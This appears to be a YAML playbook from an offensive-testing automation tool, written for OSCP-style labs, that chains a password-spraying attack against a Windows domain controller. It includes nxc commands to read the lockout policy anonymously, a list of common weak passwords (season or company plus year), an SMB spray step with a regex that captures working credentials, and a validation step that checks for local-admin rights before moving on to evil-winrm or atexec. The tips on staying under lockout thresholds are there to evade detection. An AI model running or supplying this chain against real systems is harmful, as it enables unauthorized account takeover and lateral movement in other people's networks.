id: password-spray
name: "Cred Access — password spraying (low & slow)"
description: >
  Spray a small candidate list against the user pool harvested in recon.
  Read the password policy first to size the batch and stay under the
  lockout threshold — getting an account locked out on an OSCP machine
  burns the box.
tags: [credential-access, password-spray, smb, ldap]
difficulty: easy

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: domain
    source: target_context.domain

steps:
  - id: policy_check
    name: "Password policy (lockout threshold!)"
    inline_command: "nxc smb <ip> -u '' -p '' --pass-pol"
    inputs:
      ip: "${dc_ip}"
    notes: |
      Lockout count tells you how many bad attempts per account before lockout.
      Spray 1 password per round; sleep 30+ minutes between rounds if
      lockoutWindow > 0.

  - id: build_candidates
    name: "Build candidate passwords"
    inline_command: "printf '%s\\n' Welcome1 Password1 Summer2024! Spring2025! '<Company>2024!' Passw0rd! P@ssw0rd > spray.txt"
    notes: |
      Replace `<Company>` with actual org name from web/SMB recon. Most
      domain users pick season+year or company+year. Avoid >5 unless
      lockout is disabled.

  - id: spray_smb
    name: "Spray candidates via SMB"
    command_ref: nxc-smb-spray
    inputs:
      ip: "${dc_ip}"
    notes: |
      `[+] DOMAIN\\user:password` lines = hits. Auto-extract picks them up
      as cracked_creds for downstream chains.
    capture:
      - var: spray_hits
        regex: '\[\+\]\s+\S+\\([A-Za-z0-9._-]+):(\S+)'
        match: all
        groups: { user: 1, password: 2 }

  - id: validate_hit
    name: "Validate winning credential"
    command_ref: nxc-smb-auth
    requires: [spray_hits]
    inputs:
      ip: "${dc_ip}"
    notes: |
      Re-run with the single hit to confirm + check (Pwn3d!) marker for
      local-admin rights. If Pwn3d! → straight to evil-winrm / atexec.

references:
  - title: "The Hacker Recipes — Password Spray"
    url:   "https://www.thehacker.recipes/ad/movement/credentials/dumping/spray"
  - title: "NetExec — bruteforce"
    url:   "https://www.netexec.wiki/getting-started/bruteforce"
